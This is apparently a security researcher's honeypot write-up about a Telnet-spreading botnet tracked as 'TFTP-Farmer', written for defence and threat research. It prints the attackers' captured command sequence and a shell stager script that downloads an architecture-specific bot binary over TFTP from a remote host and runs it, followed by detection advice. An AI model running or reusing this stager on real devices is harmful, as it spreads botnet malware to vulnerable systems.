+++
title = "Case File 04: Dionaea Logs Point at a New Telnet Botnet Family"
date = "2025-09-14"
description = "A cluster of Telnet sessions sharing an unusual command order leads to a previously undocumented Mirai-adjacent botnet family."
tags = ["honeypot", "dionaea", "telnet", "botnet"]
toc = true
[extra]
older = "writeups/case-file-03-upx-loader-smb.md"
newer = "writeups/case-file-05-powershell-dropper.md"
+++

Most Telnet-borne botnet traffic that hits the sensor grid is a Mirai variant running the same handful of well-worn command sequences. Over three weeks in September, a distinct cluster of sessions showed a command order that did not match any family in the local reference set, which is unusual enough to be worth a proper writeup.

<!-- more -->

## Spotting the cluster

Clustering sessions by their raw command sequence (ignoring specific arguments) surfaced the anomaly quickly — a group of 340 sessions across two sensors sharing an identical, distinctive five-command skeleton:

```text
enable
system
shell
sh
tftp -g -r update.sh <ip>; sh update.sh
```

The use of `tftp` rather than `wget` or `curl` is the tell. Most current Mirai derivatives dropped TFTP in favor of HTTP years ago because TFTP is unreliable over lossy mobile-carrier NAT, which is where a large share of vulnerable devices sit. A family still defaulting to TFTP suggests either an older, less-maintained codebase, or a target population skewed toward wired industrial or SOHO gear where TFTP is more reliably reachable — both of which are useful hypotheses for follow-up.

## The staged binary

`update.sh` fetched over TFTP staged a second download rather than running a precompiled binary directly:

```bash
#!/bin/sh
DEVICE=$(uname -m)
case "$DEVICE" in
  armv7l) ARCH=arm7 ;;
  mips)   ARCH=mips ;;
  *)      ARCH=x86  ;;
esac
tftp -g -r "bot.$ARCH" 192.0.2.201
chmod +x "bot.$ARCH"
"./bot.$ARCH" telnet_farmer
```

The `telnet_farmer` argument passed at launch matches an internal module name visible in the binary's string table, alongside `http_farmer` and `report`, implying a modular architecture that separates the scanning method from the reporting client — a step up in structure from a typical single-binary Mirai fork, even though the propagation mechanics are otherwise very familiar.

## Naming and family notes

Lacking an existing public name that matched this command skeleton and module naming, this cluster is being tracked locally as **TFTP-Farmer** pending confirmation from other researchers. If this matches a family you already track under a different name, a correction is genuinely welcome — see the about page for contact details.

## Detection notes

- Any inbound TFTP read request (`RRQ`) for a filename ending in `.sh` or an architecture suffix (`.arm7`, `.mips`, `.x86`) from an unauthenticated client is almost never legitimate on a modern network.
- The five-command skeleton above (`enable` / `system` / `shell` / `sh` / `tftp -g -r`) is distinctive enough to use as a standalone Suricata content match on Telnet sessions, independent of any specific IP or hash indicator.
- Devices only reachable via Telnet at all are already the higher-risk population; disabling Telnet management interfaces removes this entire propagation path regardless of which family is behind a given wave.
